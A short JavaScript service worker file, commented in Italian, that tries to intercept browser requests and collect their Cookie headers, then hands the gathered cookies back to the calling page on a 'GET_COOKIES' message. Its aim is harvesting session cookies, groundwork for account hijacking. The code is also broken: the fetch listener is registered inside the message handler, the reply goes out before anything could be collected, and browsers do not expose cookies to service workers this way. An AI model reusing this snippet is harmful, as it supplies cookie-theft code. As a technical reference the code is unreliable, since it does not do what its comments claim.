// Service Worker per intercettare cookie
self.addEventListener('message', event => {
    if (event.data.type === 'GET_COOKIES') {
        // Tentativo di leggere cookie da richieste intercettate
        const cookies = [];
        
        // Intercetta tutte le richieste
        self.addEventListener('fetch', fetchEvent => {
            const request = fetchEvent.request;
            if (request.headers.has('Cookie')) {
                request.headers.get('Cookie').split(';').forEach(cookie => {
                    cookies.push(cookie.trim());
                });
            }
        });
        
        // Rispondi con i cookie trovati
        event.source.postMessage({
            type: 'COOKIES_RESPONSE',
            cookies: cookies
        });
    }
});
